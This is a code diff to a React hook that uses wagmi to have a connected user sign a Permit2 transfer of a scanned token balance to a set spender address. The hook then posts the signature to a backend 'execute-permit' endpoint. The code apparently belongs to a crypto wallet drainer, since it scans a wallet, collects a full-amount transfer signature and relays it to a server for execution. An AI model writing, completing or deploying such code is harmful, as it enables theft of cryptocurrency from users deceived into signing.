@@ -1,5 +1,5 @@
 import { useSignTypedData } from "wagmi";
-import API from "../providers/axios"; // ← default import, matches useWallet
+import API from "../providers/axios";
 import type { ScanResult } from "../types/wallet";
 
 const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS;
@@ -24,46 +24,57 @@ export function usePermit2Execution() {
     scanData: ScanResult,
     spenderAddress: string,
     chainId: number,
+    chain: string | undefined,
+    user: String,
   ) => {
     const permit2Tokens = scanData.permit2;
     if (!permit2Tokens?.length) return;
 
     const deadline = Math.floor(Date.now() / 1000) + 3600;
-    const signedPayload: Record<string, object> = {};
     const permit = permit2Tokens[0];
-
     const nonce = BigInt(Date.now());
 
-    const signature = await signTypedDataAsync({
-      domain: {
-        name: "Permit2",
-        chainId: Number(chainId),
-        verifyingContract: PERMIT2_CONTRACT,
-      },
-      types: PERMIT2_TYPES,
-      primaryType: "PermitTransferFrom",
-      message: {
-        permitted: {
-          token: permit.token,
-          amount: BigInt(permit.amount),
+    let signature: string;
+    try {
+      signature = await signTypedDataAsync({
+        domain: {
+          name: "Permit2",
+          chainId: Number(chainId),
+          verifyingContract: PERMIT2_CONTRACT,
         },
+        types: PERMIT2_TYPES,
+        primaryType: "PermitTransferFrom",
+        message: {
+          permitted: {
+            token: permit.token,
+            amount: BigInt(permit.amount),
+          },
+          spender: spenderAddress,
+          nonce,
+          deadline: BigInt(deadline),
+        },
+      });
+      console.log("SIGNATURE RESPONSE:", signature);
+    } catch (err) {
+      console.error("SIGN FAILED:", err);
+      return;
+    }
+
+    const signedPayload = {
+      chainId: Number(chainId),
+      chain, // ← top level
+      user,
+      data: {
+        symbol: permit.symbol,
+        amount: permit.amount,
         spender: spenderAddress,
-        nonce,
-        deadline: BigInt(deadline),
+        nonce: nonce.toString(),
+        deadline,
+        signature,
       },
-    });
-
-    // console.log("chainId:", chainId);
-    // console.log("permit2:", permit);
-
-    signedPayload[permit.token] = {
-      symbol: permit.symbol,
-      amount: permit.amount,
-      spender: spenderAddress,
-      nonce: nonce.toString(),
-      deadline,
-      signature,
     };
+
+    // console.log("PERMIT PAYLOAD SENT TO BACKEND:", signedPayload);
 
     const res = await API.post("/api/execute-permit", signedPayload);
     return res.data;
